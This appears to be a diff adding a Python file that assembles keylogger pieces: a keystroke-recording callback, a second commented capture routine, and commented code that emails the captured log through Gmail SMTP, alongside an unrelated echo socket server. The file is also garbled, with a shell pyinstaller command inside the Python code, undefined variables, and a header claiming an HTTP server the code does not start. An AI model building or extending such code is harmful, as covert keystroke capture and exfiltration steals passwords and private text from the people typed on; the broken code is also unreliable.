@@ -1,0 +1,98 @@
+# capture keystrokes, starts http server
+
+import socket
+
+# Define the host and port for the listener
+HOST = '0.0.0.0'  # Listens on all available network interfaces
+PORT = 65432      # Port to listen on
+
+# Create a socket object
+with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+    # Bind the socket to the address and port
+    s.bind((HOST, PORT))
+    # Start listening for incoming connections
+    s.listen()
+
+    print(f"Listening on {HOST}:{PORT}")
+
+    while True:
+        # Accept a new connection
+        conn, addr = s.accept()
+        with conn:
+            print(f"Connected by {addr}")
+            while True:
+                # Receive data from the client
+                data = conn.recv(1024)
+                if not data:
+                    break
+                # Send the data back to the client (echo)
+                conn.sendall(data)
+
+
+
+def callback(key):
+        try:
+            if (33 <= ord(key.name) <= 126):
+                file.write(key.name)
+        except TypeError:
+            if key.name == "space":
+                file.write(" ")
+            if key.name == "enter":
+                file.write("\n")
+            if key.name == "backspace":
+                file.seek(0)
+                strSave = file.read()
+                file.truncate(0)
+                file.write(strSave[:-1])
+
+pyinstaller --onefile my_server.py
+
+
+
+
+# address = 'email@email.com'
+# pwrd = 'email password'
+# 
+# EM = EmailMessage()
+# EM['From'] = 'email@email.com'
+# EM['To'] = 'email password'
+# 
+# currentTime = datetime.now().strftime("%Y-%m-%d %I:%M %p")
+# EM['Subject'] = f"Log_session [{currentTime}]"
+# 
+# fileRead = open(keyspath, "r")
+# body = fileRead.read()
+# fileRead.close()
+# EM.set_content(body)
+# 
+# context = ssl.create_default_context()
+# with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
+#     smtp.login(address, pwrd)
+#     smtp.send_message(EM)
+# 
+
+
+
+
+# def keypressfunc(key):
+#     global text
+#     if keyboard.is_pressed('shift'):
+#         if key.name in special_chars.keys():
+#             text += special_chars[key.name]
+#         elif key.name.isalpha() and len(key.name) == 1:
+#             text += key.name.upper()
+#     elif key.name == "space":
+#         text += " "
+#     elif key.name == "enter":
+#         text += "\n"
+#     elif key.name == "backspace":
+#         text = text[0:-1]
+#     elif key.name in ["shift", "alt", "ctrl"]:
+#         pass
+#     else:
+#         text += str(key.name)
+
+# keyboard.on_press(callback=keypressfunc)
+# keyboard.wait('esc')
+
+# print(text)
